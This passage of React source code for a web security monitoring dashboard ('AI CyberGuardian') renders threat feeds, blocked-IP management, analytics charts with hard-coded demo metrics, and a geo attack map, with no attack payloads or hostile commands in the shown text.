        blockedAt: new Date().toISOString().replace("T", " ").slice(0, 16),
        expires: newBlockDuration,
        permanent: newBlockDuration === "Permanent",
      },
      ...prev,
    ]);
    setNewBlockIP("");
    setNewBlockReason("");
    setBlockIPModal(false);
  }

  function handleRegisterSite() {
    if (!newSiteUrl) return;
    const newSite = {
      name: newSiteName || "Web App",
      url: newSiteUrl,
      key: `gk_live_${Math.random().toString(36).slice(2, 12)}`,
      status: "Active",
      created: new Date().toISOString().slice(0, 10),
      checks: "0",
    };
    setSites((prev) => [newSite, ...prev]);
    setNewSiteName("");
    setNewSiteUrl("");
    setAddSiteModal(false);
  }

  function handleRegenerateKey() {
    setApiKey(`gk_live_${Math.random().toString(36).slice(2, 10)}${Math.random().toString(36).slice(2, 10)}`);
  }

  // Filtered Events
  const filteredEvents = useMemo(() => {
    return events.filter((e) => {
      const matchSearch =
        !searchFilter ||
        e.ip.toLowerCase().includes(searchFilter.toLowerCase()) ||
        e.type.toLowerCase().includes(searchFilter.toLowerCase()) ||
        e.country.toLowerCase().includes(searchFilter.toLowerCase());
      const matchSev = severityFilter === "ALL" || e.level === severityFilter;
      return matchSearch && matchSev;
    });
  }, [events, searchFilter, severityFilter]);

  // Filtered Attackers
  const filteredAttackers = useMemo(() => {
    return attackers.filter((a) => {
      return (
        !attackerSearch ||
        a.ip.includes(attackerSearch) ||
        a.country.toLowerCase().includes(attackerSearch.toLowerCase()) ||
        a.isp.toLowerCase().includes(attackerSearch.toLowerCase())
      );
    });
  }, [attackers, attackerSearch]);

  return (
    <div style={{ display: "flex", height: "100vh", background: T.bg, color: T.text, overflow: "hidden" }}>
      {/* ── Sidebar ── */}
      <div
        style={{
          width: 220,
          background: T.surface,
          borderRight: `1px solid ${T.border}`,
          display: "flex",
          flexDirection: "column",
          flexShrink: 0,
        }}
      >
        <div
          style={{
            padding: "16px 16px 12px",
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            gap: 8,
          }}
        >
          <span>🛡️</span>
          <span style={{ fontFamily: "monospace", fontWeight: 700, fontSize: 13, color: T.blue }}>
            AI CyberGuardian
          </span>
        </div>

        <div style={{ padding: "8px 8px", flex: 1, overflowY: "auto" }}>
          {navItems.map((n) => {
            const active = activeNav === n.id;
            return (
              <div
                key={n.id}
                onClick={() => setActiveNav(n.id)}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "7px 10px",
                  borderRadius: 5,
                  cursor: "pointer",
                  marginBottom: 2,
                  background: active ? "rgba(88,166,255,0.12)" : "transparent",
                  borderLeft: `2px solid ${active ? T.blue : "transparent"}`,
                  color: active ? T.blue : T.muted,
                  fontSize: 13,
                  fontWeight: active ? 600 : 400,
                  transition: "all 0.12s",
                }}
              >
                <span style={{ fontSize: 12 }}>{n.icon}</span>
                {n.label}
              </div>
            );
          })}

          <div style={{ borderTop: `1px solid ${T.border}`, margin: "8px 0" }} />

          {bottomNavItems.map((n) => {
            const active = activeNav === n.id;
            return (
              <div
                key={n.id}
                onClick={() => setActiveNav(n.id)}
                style={{
                  display: "flex",
                  alignItems: "center",
                  gap: 8,
                  padding: "7px 10px",
                  borderRadius: 5,
                  cursor: "pointer",
                  marginBottom: 2,
                  background: active ? "rgba(88,166,255,0.12)" : "transparent",
                  borderLeft: `2px solid ${active ? T.blue : "transparent"}`,
                  color: active ? T.blue : T.muted,
                  fontSize: 13,
                  fontWeight: active ? 600 : 400,
                  transition: "all 0.12s",
                }}
              >
                <span style={{ fontSize: 12 }}>{n.icon}</span>
                {n.label}
              </div>
            );
          })}
        </div>

        <div style={{ padding: "12px 14px", borderTop: `1px solid ${T.border}` }}>
          <div style={{ fontSize: 11, color: T.muted }}>client@example.com</div>
          <div
            onClick={() => onNav("landing")}
            style={{ fontSize: 11, color: T.blue, cursor: "pointer", marginTop: 3 }}
          >
            ← Sign out
          </div>
        </div>
      </div>

      {/* ── Main Content Area ── */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", overflow: "hidden" }}>
        {/* Topbar */}
        <div
          style={{
            height: 52,
            borderBottom: `1px solid ${T.border}`,
            display: "flex",
            alignItems: "center",
            justifyContent: "space-between",
            padding: "0 20px",
            flexShrink: 0,
            background: T.surface,
          }}
        >
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontWeight: 600, fontSize: 15 }}>
              {activeNav === "overview" && "Dashboard Overview"}
              {activeNav === "feed" && "Live Threat Feed"}
              {activeNav === "analytics" && "Analytics"}
              {activeNav === "geo" && "Geo Threat Map"}
              {activeNav === "blocked" && "Blocked IPs"}
              {activeNav === "honeypot" && "Honeypot Sessions"}
              {activeNav === "attackers" && "Attacker Profiles"}
              {activeNav === "sites" && "Site Management"}
              {activeNav === "reports" && "Reports"}
              {activeNav === "settings" && "Settings"}
            </span>
            <span style={{ color: T.muted, fontSize: 11 }}>
              <span style={{ color: backendOnline ? T.low : T.blue }}>●</span>{" "}
              {backendOnline ? "Live Backend Connected" : "Live — updating every 3.5s"}
            </span>
          </div>
          <div style={{ display: "flex", gap: 8 }}>
            <Btn small onClick={() => setReportSuccessModal(true)}>
              Export PDF
            </Btn>
            <Btn small primary onClick={() => setAddSiteModal(true)}>
              + Add Site
            </Btn>
          </div>
        </div>

        {/* Scrollable View Container */}
        <div style={{ flex: 1, overflowY: "auto", padding: 16 }}>
          {/* ════ VIEW 1: OVERVIEW ════ */}
          {activeNav === "overview" && (
            <div>
              {/* Stat cards */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🛡️"
                  label="Threats Today"
                  value={totalThreats}
                  sub="↑ 12% vs yesterday"
                  color={T.blue}
                />
                <StatCard
                  icon="🚫"
                  label="IPs Blocked"
                  value={blockedCount}
                  sub="↑ 5% vs yesterday"
                  color={T.high}
                />
                <StatCard
                  icon="🍯"
                  label="Honeypot Sessions"
                  value={honeypotLiveCount}
                  sub={`${honeypotLiveCount} active right now`}
                  color={T.purple}
                />
                <StatCard
                  icon="✅"
                  label="Detection Rate"
                  value="91.3%"
                  sub="FP rate: 4.2%"
                  color={T.low}
                />
              </div>

              {/* Row 2: Live Feed + Attack Types Pie */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle
                    icon="📋"
                    title="LIVE THREAT FEED"
                    right={
                      <span
                        onClick={() => setActiveNav("feed")}
                        style={{ color: T.blue, cursor: "pointer", fontSize: 11 }}
                      >
                        View all {events.length} →
                      </span>
                    }
                  />
                  <div style={{ maxHeight: 240, overflowY: "auto" }}>
                    <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                      <thead>
                        <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                          {["Time", "IP", "Country", "Attack", "Severity", "Score"].map((h) => (
                            <th
                              key={h}
                              style={{
                                color: T.muted,
                                fontWeight: 500,
                                padding: "0 6px 6px",
                                textAlign: "left",
                                fontSize: 11,
                              }}
                            >
                              {h}
                            </th>
                          ))}
                        </tr>
                      </thead>
                      <tbody>
                        {events.slice(0, 10).map((e, i) => (
                          <tr
                            key={e.id}
                            onClick={() => onOpenAttacker(e.ip)}
                            style={{
                              borderBottom: `1px solid ${T.border}20`,
                              cursor: "pointer",
                              background: e.id === newId && i === 0 ? "rgba(88,166,255,0.06)" : "transparent",
                              transition: "background 0.4s",
                            }}
                          >
                            <td style={{ padding: "6px 6px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                              {e.time}
                            </td>
                            <td style={{ padding: "6px 6px", fontFamily: "monospace", fontSize: 11, color: T.blue }}>
                              {e.ip}
                            </td>
                            <td style={{ padding: "6px 6px", fontSize: 11 }}>{e.country}</td>
                            <td style={{ padding: "6px 6px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "1px 6px",
                                  borderRadius: 3,
                                  fontSize: 11,
                                  color: T.text,
                                }}
                              >
                                {e.type}
                              </span>
                            </td>
                            <td style={{ padding: "6px 6px" }}>
                              <Badge level={e.level} small />
                            </td>
                            <td style={{ padding: "6px 6px", minWidth: 80 }}>
                              <ScoreBar score={e.score} compact />
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </Card>

                <Card>
                  <PanelTitle icon="🥧" title="ATTACK TYPES" />
                  <ResponsiveContainer width="100%" height={120}>
                    <PieChart>
                      <Pie
                        data={PIE_DATA}
                        cx="50%"
                        cy="50%"
                        innerRadius={32}
                        outerRadius={52}
                        dataKey="value"
                        strokeWidth={0}
                      >
                        {PIE_DATA.map((e, i) => (
                          <Cell key={i} fill={e.color} />
                        ))}
                      </Pie>
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 5,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                    </PieChart>
                  </ResponsiveContainer>
                  <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 4, marginTop: 8 }}>
                    {PIE_DATA.map((d) => (
                      <div key={d.name} style={{ display: "flex", alignItems: "center", gap: 5, fontSize: 11 }}>
                        <span style={{ width: 7, height: 7, background: d.color, borderRadius: "50%", flexShrink: 0 }} />
                        <span style={{ color: T.muted }}>{d.name}</span>
                        <span style={{ color: T.text, marginLeft: "auto", fontFamily: "monospace" }}>{d.value}%</span>
                      </div>
                    ))}
                  </div>
                </Card>
              </div>

              {/* Row 3: Timeline + Top Attackers */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 300px", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle icon="📈" title="THREATS OVER TIME" right="Last 24 hours" />
                  <ResponsiveContainer width="100%" height={140}>
                    <LineChart data={TIMELINE_DATA} margin={{ top: 5, right: 10, bottom: 0, left: -20 }}>
                      <XAxis dataKey="hour" tick={{ fontSize: 9, fill: T.muted }} interval={1} axisLine={false} tickLine={false} />
                      <YAxis tick={{ fontSize: 9, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 5,
                          fontSize: 11,
                          color: T.text,
                        }}
                        labelStyle={{ color: T.muted }}
                      />
                      <Line dataKey="CRITICAL" stroke={T.critical} strokeWidth={1.5} dot={false} />
                      <Line dataKey="HIGH" stroke={T.high} strokeWidth={1.5} dot={false} />
                      <Line dataKey="MEDIUM" stroke={T.medium} strokeWidth={1.5} dot={false} />
                      <Line dataKey="LOW" stroke={T.low} strokeWidth={1.5} dot={false} />
                    </LineChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 12, marginTop: 6 }}>
                    {["CRITICAL", "HIGH", "MEDIUM", "LOW"].map((l) => (
                      <div key={l} style={{ display: "flex", alignItems: "center", gap: 4, fontSize: 10 }}>
                        <span style={{ width: 10, height: 2, background: sevColor[l], borderRadius: 1 }} />
                        <span style={{ color: T.muted }}>{l}</span>
                      </div>
                    ))}
                  </div>
                </Card>

                <Card>
                  <PanelTitle
                    icon="🏆"
                    title="TOP ATTACKERS"
                    right={
                      <span
                        onClick={() => setActiveNav("attackers")}
                        style={{ color: T.blue, cursor: "pointer", fontSize: 11 }}
                      >
                        All →
                      </span>
                    }
                  />
                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                    {attackers.slice(0, 5).map((ip, i) => (
                      <div
                        key={ip.ip}
                        onClick={() => onOpenAttacker(ip.ip)}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 8,
                          padding: "5px 8px",
                          borderRadius: 5,
                          cursor: "pointer",
                          background: T.surface2,
                        }}
                      >
                        <span style={{ color: T.muted, fontSize: 11, minWidth: 14, fontFamily: "monospace" }}>
                          #{i + 1}
                        </span>
                        <div style={{ flex: 1, minWidth: 0 }}>
                          <div
                            style={{
                              fontFamily: "monospace",
                              fontSize: 11,
                              color: T.blue,
                              whiteSpace: "nowrap",
                              overflow: "hidden",
                              textOverflow: "ellipsis",
                            }}
                          >
                            {ip.ip}
                          </div>
                          <div style={{ fontSize: 10, color: T.muted }}>
                            {ip.flag} {ip.country}
                          </div>
                        </div>
                        <div style={{ textAlign: "right" }}>
                          <div
                            style={{
                              fontFamily: "monospace",
                              fontSize: 12,
                              fontWeight: 700,
                              color: sevColor[ip.level],
                            }}
                          >
                            {ip.total}
                          </div>
                          <Badge level={ip.level} small />
                        </div>
                      </div>
                    ))}
                  </div>
                </Card>
              </div>

              {/* Row 4: Blocked IPs + Honeypot */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                <Card>
                  <PanelTitle
                    icon="🚫"
                    title="BLOCKED IPs"
                    right={
                      <Btn small onClick={() => setActiveNav("blocked")}>
                        Manage
                      </Btn>
                    }
                  />
                  <table style={{ width: "100%", fontSize: 11, borderCollapse: "collapse" }}>
                    <thead>
                      <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                        {["IP", "Reason", "Blocked At", "Action"].map((h) => (
                          <th
                            key={h}
                            style={{ color: T.muted, padding: "0 6px 5px", textAlign: "left", fontWeight: 500 }}
                          >
                            {h}
                          </th>
                        ))}
                      </tr>
                    </thead>
                    <tbody>
                      {blockedList.slice(0, 4).map((e) => (
                        <tr key={e.ip} style={{ borderBottom: `1px solid ${T.border}20` }}>
                          <td style={{ padding: "5px 6px", fontFamily: "monospace", color: T.blue }}>{e.ip}</td>
                          <td style={{ padding: "5px 6px", color: T.muted }}>{e.reason}</td>
                          <td style={{ padding: "5px 6px", color: T.muted, fontFamily: "monospace" }}>{e.blockedAt}</td>
                          <td style={{ padding: "5px 6px" }}>
                            <Btn small danger onClick={() => handleUnblock(e.ip)}>
                              Unblock
                            </Btn>
                          </td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </Card>

                <Card glow={honeypotLiveCount > 0}>
                  <PanelTitle
                    icon="🍯"
                    title="HONEYPOT SESSIONS"
                    right={
                      <span style={{ color: T.low, fontSize: 11 }}>● {honeypotLiveCount} active</span>
                    }
                  />
                  <div style={{ display: "flex", flexDirection: "column", gap: 6 }}>
                    {honeypotSessions.slice(0, 3).map((s) => (
                      <div
                        key={s.id}
                        onClick={() => {
                          setActiveNav("honeypot");
                          setExpandedSessionId(s.id);
                        }}
                        style={{
                          display: "flex",
                          alignItems: "center",
                          gap: 10,
                          padding: "7px 10px",
                          background: T.surface2,
                          borderRadius: 5,
                          cursor: "pointer",
                        }}
                      >
                        <div style={{ flex: 1 }}>
                          <div style={{ fontFamily: "monospace", fontSize: 11, color: T.blue }}>{s.ip}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{s.country}</div>
                        </div>
                        <div style={{ textAlign: "right" }}>
                          <div style={{ fontSize: 11, color: T.text, fontFamily: "monospace" }}>{s.duration}</div>
                          <div style={{ fontSize: 10, color: T.muted }}>{s.requestsCount} requests</div>
                        </div>
                        <div
                          style={{
                            width: 8,
                            height: 8,
                            borderRadius: "50%",
                            background: s.live ? T.low : T.muted,
                            boxShadow: s.live ? `0 0 6px ${T.low}` : "none",
                          }}
                        />
                      </div>
                    ))}
                  </div>
                </Card>
              </div>
            </div>
          )}

          {/* ════ VIEW 2: LIVE THREAT FEED (FULL LOG) ════ */}
          {activeNav === "feed" && (
            <Card>
              <div
                style={{
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "space-between",
                  marginBottom: 14,
                  flexWrap: "wrap",
                  gap: 10,
                }}
              >
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <span style={{ fontSize: 14 }}>📋</span>
                  <span style={{ fontWeight: 600, fontSize: 14 }}>LIVE THREAT FEED — FULL LOG</span>
                  <span style={{ color: T.muted, fontSize: 12 }}>
                    ({filteredEvents.length} of {events.length} events)
                  </span>
                </div>
                <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
                  <input
                    value={searchFilter}
                    onChange={(e) => setSearchFilter(e.target.value)}
                    placeholder="Search IP or attack type..."
                    style={{
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "5px 10px",
                      fontSize: 12,
                      width: 200,
                    }}
                  />
                  <select
                    value={severityFilter}
                    onChange={(e) => setSeverityFilter(e.target.value)}
                    style={{
                      background: T.surface2,
                      border: `1px solid ${T.border}`,
                      color: T.text,
                      borderRadius: 4,
                      padding: "5px 10px",
                      fontSize: 12,
                    }}
                  >
                    <option value="ALL">All Severities</option>
                    <option value="CRITICAL">CRITICAL</option>
                    <option value="HIGH">HIGH</option>
                    <option value="MEDIUM">MEDIUM</option>
                    <option value="LOW">LOW</option>
                  </select>
                  <Btn small onClick={() => setEvents((prev) => [genEvent(), ...prev])}>
                    ↺ Refresh
                  </Btn>
                </div>
              </div>

              <div style={{ overflowX: "auto" }}>
                <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Time", "IP", "Country", "Method", "Endpoint", "Attack", "Severity", "Score", "Action"].map(
                        (h) => (
                          <th
                            key={h}
                            style={{
                              color: T.muted,
                              fontWeight: 500,
                              padding: "8px 8px",
                              textAlign: "left",
                              fontSize: 11,
                            }}
                          >
                            {h}
                          </th>
                        )
                      )}
                    </tr>
                  </thead>
                  <tbody>
                    {filteredEvents.map((e) => {
                      const isExpanded = expandedEventId === e.id;
                      return (
                        <>
                          <tr
                            key={e.id}
                            onClick={() => setExpandedEventId(isExpanded ? null : e.id)}
                            style={{
                              borderBottom: `1px solid ${T.border}20`,
                              cursor: "pointer",
                              background: isExpanded ? "rgba(88,166,255,0.05)" : "transparent",
                            }}
                          >
                            <td style={{ padding: "8px 8px", color: T.muted, fontFamily: "monospace", fontSize: 11 }}>
                              {e.time}
                            </td>
                            <td
                              style={{ padding: "8px 8px", fontFamily: "monospace", fontSize: 11, color: T.blue }}
                              onClick={(ev) => {
                                ev.stopPropagation();
                                onOpenAttacker(e.ip);
                              }}
                            >
                              {e.ip}
                            </td>
                            <td style={{ padding: "8px 8px", fontSize: 11 }}>{e.country}</td>
                            <td style={{ padding: "8px 8px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "2px 6px",
                                  borderRadius: 3,
                                  fontSize: 10,
                                  color: T.blue,
                                  fontFamily: "monospace",
                                }}
                              >
                                {e.method}
                              </span>
                            </td>
                            <td style={{ padding: "8px 8px", fontFamily: "monospace", fontSize: 11 }}>{e.path}</td>
                            <td style={{ padding: "8px 8px" }}>
                              <span
                                style={{
                                  background: T.surface2,
                                  padding: "2px 6px",
                                  borderRadius: 3,
                                  fontSize: 11,
                                }}
                              >
                                {e.type}
                              </span>
                            </td>
                            <td style={{ padding: "8px 8px" }}>
                              <Badge level={e.level} small />
                            </td>
                            <td style={{ padding: "8px 8px", minWidth: 90 }}>
                              <ScoreBar score={e.score} compact />
                            </td>
                            <td style={{ padding: "8px 8px", color: T.muted, fontSize: 11 }}>
                              {isExpanded ? "▲ Hide" : "▼ Inspect"}
                            </td>
                          </tr>
                          {isExpanded && (
                            <tr style={{ background: T.surface2 }}>
                              <td colSpan={9} style={{ padding: "12px 14px", borderBottom: `1px solid ${T.border}` }}>
                                <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12 }}>
                                  <div>
                                    <div style={{ color: T.muted, fontSize: 11, marginBottom: 4 }}>
                                      INTERCEPTED PAYLOAD:
                                    </div>
                                    <pre
                                      style={{
                                        margin: 0,
                                        background: T.bg,
                                        padding: 8,
                                        borderRadius: 4,
                                        fontSize: 11,
                                        color: T.critical,
                                        fontFamily: "monospace",
                                        overflowX: "auto",
                                      }}
                                    >
                                      {e.payload}
                                    </pre>
                                  </div>
                                  <div>
                                    <div style={{ color: T.muted, fontSize: 11, marginBottom: 4 }}>
                                      DEFENSE ACTION & TELEMETRY:
                                    </div>
                                    <div style={{ fontSize: 11, color: T.text, lineHeight: 1.6 }}>
                                      <div>
                                        Status: <span style={{ color: T.green }}>{e.status}</span>
                                      </div>
                                      <div>
                                        Origin ISP: <span style={{ color: T.muted }}>{e.isp}</span>
                                      </div>
                                      <div style={{ marginTop: 6, display: "flex", gap: 8 }}>
                                        <Btn
                                          small
                                          danger
                                          onClick={() => {
                                            apiBlockIP(e.ip, `${e.type} attack detected`);
                                            setBlockedList((p) => [
                                              {
                                                ip: e.ip,
                                                reason: `${e.type} attack detected`,
                                                blockedAt: new Date().toISOString().replace("T", " ").slice(0, 16),
                                                expires: "Permanent",
                                                permanent: true,
                                              },
                                              ...p,
                                            ]);
                                          }}
                                        >
                                          Block IP
                                        </Btn>
                                        <Btn small onClick={() => onOpenAttacker(e.ip)}>
                                          Attacker Profile →
                                        </Btn>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          )}
                        </>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            </Card>
          )}

          {/* ════ VIEW 3: ANALYTICS ════ */}
          {activeNav === "analytics" && (
            <div>
              {/* Analytics KPI Row */}
              <div style={{ display: "grid", gridTemplateColumns: "repeat(4,1fr)", gap: 12, marginBottom: 14 }}>
                <StatCard
                  icon="🎯"
                  label="Avg Detection Rate"
                  value="91.3%"
                  sub="7-day average"
                  color={T.green}
                />
                <StatCard
                  icon="⚠️"
                  label="Avg FP Rate"
                  value="4.6%"
                  sub="Target: < 5%"
                  color={T.medium}
                />
                <StatCard
                  icon="⏱️"
                  label="Avg Latency (P95)"
                  value="1.8s"
                  sub="Target: < 3s"
                  color={T.blue}
                />
                <StatCard
                  icon="🚀"
                  label="Requests Analysed"
                  value="2.1M"
                  sub="Last 7 days"
                  color={T.purple}
                />
              </div>

              {/* Charts Row */}
              <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 12, marginBottom: 14 }}>
                <Card>
                  <PanelTitle icon="📊" title="ATTACKS BY TYPE (vs False Positives)" />
                  <ResponsiveContainer width="100%" height={180}>
                    <BarChart
                      data={[
                        { name: "SQLi", attacks: 120, fp: 6 },
                        { name: "XSS", attacks: 80, fp: 4 },
                        { name: "BruteForce", attacks: 48, fp: 2 },
                        { name: "PathTraversal", attacks: 32, fp: 1 },
                        { name: "Scanner", attacks: 25, fp: 2 },
                      ]}
                      margin={{ top: 10, right: 10, bottom: 0, left: -10 }}
                    >
                      <XAxis dataKey="name" tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <YAxis tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 4,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                      <Bar dataKey="attacks" fill={T.blue} radius={[3, 3, 0, 0]} />
                      <Bar dataKey="fp" fill={T.critical} radius={[3, 3, 0, 0]} />
                    </BarChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 11 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.blue, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>Attacks Detected</span>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.critical, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>False Positives</span>
                    </div>
                  </div>
                </Card>

                <Card>
                  <PanelTitle icon="📈" title="DETECTION RATE vs FP RATE (7 DAYS)" />
                  <ResponsiveContainer width="100%" height={180}>
                    <LineChart
                      data={[
                        { day: "Mon", detection: 91.1, fp: 4.8 },
                        { day: "Tue", detection: 91.5, fp: 4.6 },
                        { day: "Wed", detection: 90.8, fp: 4.9 },
                        { day: "Thu", detection: 92.0, fp: 4.2 },
                        { day: "Fri", detection: 91.4, fp: 4.5 },
                        { day: "Sat", detection: 92.3, fp: 4.1 },
                        { day: "Sun", detection: 91.8, fp: 4.3 },
                      ]}
                      margin={{ top: 10, right: 10, bottom: 0, left: -10 }}
                    >
                      <XAxis dataKey="day" tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <YAxis domain={[0, 100]} tick={{ fontSize: 10, fill: T.muted }} axisLine={false} tickLine={false} />
                      <Tooltip
                        contentStyle={{
                          background: T.surface2,
                          border: `1px solid ${T.border}`,
                          borderRadius: 4,
                          fontSize: 11,
                          color: T.text,
                        }}
                      />
                      <Line dataKey="detection" stroke={T.green} strokeWidth={2} dot={{ r: 3 }} />
                      <Line dataKey="fp" stroke={T.critical} strokeWidth={2} dot={{ r: 3 }} />
                    </LineChart>
                  </ResponsiveContainer>
                  <div style={{ display: "flex", gap: 16, marginTop: 8, fontSize: 11 }}>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.green, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>Detection Rate (%)</span>
                    </div>
                    <div style={{ display: "flex", alignItems: "center", gap: 6 }}>
                      <span style={{ width: 8, height: 8, background: T.critical, borderRadius: 2 }} />
                      <span style={{ color: T.muted }}>False Positive Rate (%)</span>
                    </div>
                  </div>
                </Card>
              </div>

              {/* Model Performance Breakdown Matrix */}
              <Card>
                <PanelTitle icon="🧪" title="MODEL PERFORMANCE BREAKDOWN" />
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Attack Class", "Precision", "Recall", "F1 Score", "Support"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            fontWeight: 500,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {[
                      { class: "Normal", precision: "0.97", recall: "0.98", f1: "0.975", support: "18,290" },
                      { class: "SQLi", precision: "0.94", recall: "0.91", f1: "0.925", support: "3,400" },
                      { class: "XSS", precision: "0.89", recall: "0.86", f1: "0.875", support: "2,090" },
                      { class: "BruteForce", precision: "0.91", recall: "0.90", f1: "0.905", support: "2,100" },
                      { class: "PathTraversal", precision: "0.85", recall: "0.82", f1: "0.835", support: "1,750" },
                      { class: "Scanner", precision: "0.96", recall: "0.95", f1: "0.955", support: "4,120" },
                    ].map((m) => (
                      <tr key={m.class} style={{ borderBottom: `1px solid ${T.border}20` }}>
                        <td style={{ padding: "6px 8px", fontWeight: 600, color: T.text }}>{m.class}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.blue }}>{m.precision}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.green }}>{m.recall}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.purple }}>{m.f1}</td>
                        <td style={{ padding: "6px 8px", fontFamily: "monospace", color: T.muted }}>{m.support}</td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </Card>
            </div>
          )}

          {/* ════ VIEW 4: GEO MAP ════ */}
          {activeNav === "geo" && (
            <div>
              <Card style={{ marginBottom: 14 }}>
                <PanelTitle icon="🌍" title="GLOBAL ATTACK ORIGIN DISTRIBUTION" right="Live Sensor Feeds" />
                <div
                  style={{
                    height: 220,
                    background: `radial-gradient(ellipse at 50% 50%, #162436 0%, #0D1117 80%)`,
                    borderRadius: 6,
                    border: `1px solid ${T.border}`,
                    position: "relative",
                    overflow: "hidden",
                    display: "flex",
                    alignItems: "center",
                    justifyContent: "center",
                  }}
                >
                  {/* Stylized world grid dots */}
                  <svg width="100%" height="100%" style={{ position: "absolute", inset: 0, opacity: 0.35 }}>
                    <pattern id="grid" width="20" height="20" patternUnits="userSpaceOnUse">
                      <circle cx="2" cy="2" r="1" fill={T.blue} />
                    </pattern>
                    <rect width="100%" height="100%" fill="url(#grid)" />
                  </svg>

                  {/* Dynamic threat pins */}
                  {[
                    { x: "78%", y: "42%", label: "Beijing", count: 47, col: T.critical },
                    { x: "64%", y: "30%", label: "Moscow", count: 31, col: T.high },
                    { x: "36%", y: "70%", label: "São Paulo", count: 28, col: T.high },
                    { x: "52%", y: "34%", label: "Frankfurt", count: 19, col: T.medium },
                    { x: "70%", y: "52%", label: "Mumbai", count: 14, col: T.medium },
                    { x: "24%", y: "38%", label: "Ashburn", count: 9, col: T.low },
                  ].map((p, i) => (
                    <div
                      key={i}
                      style={{
                        position: "absolute",
                        left: p.x,
                        top: p.y,
                        transform: "translate(-50%, -50%)",
                        display: "flex",
                        flexDirection: "column",
                        alignItems: "center",
                        cursor: "pointer",
                      }}
                      onClick={() => setActiveNav("attackers")}
                    >
                      <div
                        style={{
                          width: 12,
                          height: 12,
                          borderRadius: "50%",
                          background: p.col,
                          boxShadow: `0 0 12px ${p.col}`,
                        }}
                      />
                      <span
                        style={{
                          fontSize: 10,
                          fontWeight: 600,
                          color: T.text,
                          background: `${T.surface}cc`,
                          padding: "1px 4px",
                          borderRadius: 3,
                          marginTop: 3,
                          border: `1px solid ${T.border}`,
                        }}
                      >
                        {p.label} ({p.count})
                      </span>
                    </div>
                  ))}
                </div>
              </Card>

              <Card>
                <PanelTitle icon="🏳️" title="ORIGIN NATION BREAKDOWN" />
                <table style={{ width: "100%", fontSize: 12, borderCollapse: "collapse" }}>
                  <thead>
                    <tr style={{ borderBottom: `1px solid ${T.border}` }}>
                      {["Country", "Total Attacks", "Primary Vector", "Severity", "Traffic Share"].map((h) => (
                        <th
                          key={h}
                          style={{
                            color: T.muted,
                            fontWeight: 500,
                            padding: "6px 8px",
                            textAlign: "left",
                            fontSize: 11,
                          }}
                        >
                          {h}
                        </th>
                      ))}
                    </tr>
                  </thead>
                  <tbody>
                    {[
